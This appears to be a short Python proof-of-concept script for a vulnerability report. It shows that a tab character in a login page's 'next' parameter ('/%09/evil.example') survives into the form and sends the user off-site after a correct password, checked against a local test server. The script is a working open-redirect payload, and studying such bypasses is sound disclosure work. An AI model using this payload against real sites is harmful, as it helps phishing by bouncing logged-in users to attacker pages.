#!/usr/bin/env python3
# /// script
# requires-python = ">=3.11"
# dependencies = []
# ///
"""Show that a tab in the login `next` parameter redirects off-site after a correct password."""

import html
import os
import re
import urllib.error
import urllib.parse
import urllib.request

BASE = os.environ.get("BASE", "http://127.0.0.1:18504")
PASSWORD = os.environ.get("STAFF_PASSWORD", "testpass123")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


opener = urllib.request.build_opener(NoRedirect)
page = opener.open(f"{BASE}/login?next=/%09/evil.example").read().decode()
hidden = html.unescape(re.search(r'name="next" value="([^"]*)"', page).group(1))
print(f"hidden next field: {hidden!r}")

body = urllib.parse.urlencode({"next": hidden, "password": PASSWORD}).encode()
try:
    opener.open(f"{BASE}/login", data=body)
except urllib.error.HTTPError as exc:
    print(f"POST /login -> {exc.code} Location: {exc.headers.get('Location')}")
